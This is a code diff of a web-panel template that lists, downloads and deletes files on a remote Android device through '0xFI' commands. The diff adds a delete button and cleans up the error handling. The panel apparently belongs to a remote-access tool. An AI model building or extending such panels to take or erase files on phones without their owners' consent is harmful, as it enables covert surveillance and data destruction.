@@ -1,15 +1,16 @@
 <div class="ui segment">
     <div class="ui secondary menu">
         <div class="right menu">
-            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
-                    class="icon home"></i>Home</button>
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop">
+                <i class="icon home"></i>Home
+            </button>
             <!-- Home = /storage/emulated/0 -->
         </div>
     </div>
     <table class="ui celled table">
         <thead>
             <tr>
-                <th style="text-align: center" colspan="2">Files</th>
+                <th style="text-align: center" colspan="3">Files</th>
             </tr>
         </thead>
         <tbody>
@@ -18,13 +19,19 @@
                 <td title="<%= item.path %>"><%= item.name %></td>
                 <td class="collapsing">
                     <% if(!item.isDir) { %>
-                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
-                            class="icon download blue"></i></button>
+                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">
+                        &nbsp;&nbsp;&nbsp;<i class="icon download blue"></i>
+                    </button>
                     <% } else { %>
-                    <button class="ui button dlop"
-                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
-                            class="icon folder open grey"></i></button>
+                    <button class="ui button dlop" onclick="openDirectory(this, '<%= item.path %>')">
+                        &nbsp;&nbsp;&nbsp;<i class="icon folder open grey"></i>
+                    </button>
                     <% } %>
+                </td>
+                <td class="collapsing">
+                    <button class="ui red button" onclick="deleteFile('<%= item.path %>')">
+                        &nbsp;&nbsp;&nbsp;<i class="icon trash"></i>Delete
+                    </button>
                 </td>
             </tr>
             <% }) %>
@@ -32,62 +39,66 @@
     </table>
 
     <script>
-
         function openDirectory(element, path) {
             $(element).children().css("opacity", "0");
-            $(element).addClass('blue');
-            $(element).addClass('loading');
+            $(element).addClass('blue loading');
             $('.dlop').addClass('disabled');
             sendCommand('0xFI', {
                 action: 'ls',
                 path
             }, (error, message) => {
                 if (error) {
+                    showNotification('#f03434', error);
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('blue loading');
+                } else if (message === 'Requested') {
+                    showNotification('#2ecc71', 'Requesting Files, Please Wait');
                     setTimeout(() => {
-                        showNotification('#f03434', error)
-                        $(element).children().css("opacity", "1");
-                        $(element).removeClass('blue');
-                        $('.dlop').removeClass('loading')
-                    }, 300)
-                } else {
-                    if (message === 'Requested') {
-                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
-                        setTimeout(() => {
-                            location.reload();
-                        }, 500)
-                    }
+                        location.reload();
+                    }, 500);
                 }
-            })
+            });
         }
 
         function downloadFile(element, path) {
             $(element).children().css("opacity", "0");
-            $(element).addClass('green');
-            $(element).addClass('loading');
+            $(element).addClass('green loading');
             $('.dlop').addClass('disabled');
             sendCommand('0xFI', {
                 action: 'dl',
                 path
             }, (error, message) => {
                 if (error) {
+                    showNotification('#f03434', error);
+                    $(element).children().css("opacity", "1");
+                    $(element).removeClass('green loading');
+                } else if (message === 'Requested') {
                     setTimeout(() => {
-                        showNotification('#f03434', error)
                         $(element).children().css("opacity", "1");
-                        $(element).removeClass('green');
-                        $('.dlop').removeClass('disabled')
-                    }, 300)
-                } else {
-                    if (message === 'Requested') {
-                        setTimeout(() => {
-                            $(element).children().css("opacity", "1");
-                            $(element).removeClass('green');
-                            $(element).removeClass('loading');
-                            $('.dlop').removeClass('disabled')
-                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
-                        }, 300)
-                    }
+                        $(element).removeClass('green loading');
+                        $('.dlop').removeClass('disabled');
+                        showNotification('#2ecc71', 'Downloading File, It will be available in `Downloads` Soon');
+                    }, 300);
                 }
-            })
+            });
+        }
+
+        function deleteFile(path) {
+            if (confirm('Are you sure you want to delete this file?')) {
+                sendCommand('0xFI', {
+                    action: 'delete',
+                    path
+                }, (error, message) => {
+                    if (error) {
+                        showNotification('#f03434', error);
+                    } else {
+                        showNotification('#2ecc71', 'File deleted successfully');
+                        setTimeout(() => {
+                            location.reload();
+                        }, 500);
+                    }
+                });
+            }
         }
     </script>
 </div>
